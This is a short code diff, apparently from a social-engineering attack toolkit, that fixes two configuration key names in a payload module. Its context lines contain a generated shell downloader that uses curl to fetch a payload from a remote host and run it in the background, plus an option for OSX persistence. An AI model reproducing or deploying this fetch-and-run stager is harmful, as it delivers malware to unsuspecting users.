@@ -174,7 +174,7 @@ if posix == True:
     downloader = "#!/bin/sh\ncurl -C -O http://%s/%s > /tmp/%s\nchmod +x /tmp/%s\n./tmp/%s %s %s &" % (
         payload_flags[1], osx_name, osx_name, osx_name, osx_name, payload_flags[1], payload_flags[2])
     filewrite.write(downloader + "\n")
-    persistence = check_config("ENABLE_PERSISTENCE_OSX=").lower()
+    persistence = check_config("ENABLE_PERSISTENCE_OSX").lower()
     if persistence == "on":
         # modified persistence osx from
         # http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
@@ -272,7 +272,7 @@ if posix == True:
                     userconfigpath + "web_clone/%s" % (osx_down))
 
 # check to see if we are using a staged approach or direct shell
-stager = check_config("SET_SHELL_STAGER=").lower()
+stager = check_config("SET_SHELL_STAGER").lower()
 if stager == "off" or payload_selection == "SETSHELL_HTTP":
     # only trigger if we are using the SETSHELL
     if payload_selection == "SETSHELL" or payload_selection == "SETSHELL_HTTP":
